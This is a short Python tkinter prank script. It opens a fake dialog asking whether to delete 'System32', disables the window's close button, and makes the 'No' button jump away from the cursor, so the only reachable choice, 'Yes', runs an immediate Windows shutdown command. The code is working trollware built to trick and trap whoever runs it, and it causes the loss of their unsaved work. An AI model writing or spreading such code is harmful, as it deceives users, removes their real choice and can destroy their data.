import tkinter as tk
import random as ran
import os

def disable_event():
    pass

def teleport_button(event):
    x, y = event.x_root, event.y_root
    ran_x=ran.randint(1, 230)
    ran_y=ran.randint(1, 76)

    button_x, button_y = no.winfo_rootx(), no.winfo_rooty()
    
    distance = ((x - button_x)**2 + (y - button_y)**2)**0.5
    
    if distance < 18:
        no.place(x=ran_x, y=ran_y)
    if distance < 18:
        no.place(x=ran_x, y=ran_y)

def confirm():
    os.system('shutdown /s /t "0"')

window = tk.Tk()
window.geometry("250x100")
window.title("Choosing")
window.protocol("WM_DELETE_WINDOW", disable_event)
window.resizable(False, False)

text = tk.Label(window, text='Are you sure deleting file "System32"?', font=("Helvetica", 12), wraplength=242)
text.pack()

yes = tk.Button(window, text="Yes", command=confirm)
no = tk.Button(window, text="No")

yes.pack(side=tk.LEFT, padx=50)
no.pack(side=tk.RIGHT, padx=50)

window.bind('<Motion>', teleport_button)

window.mainloop()
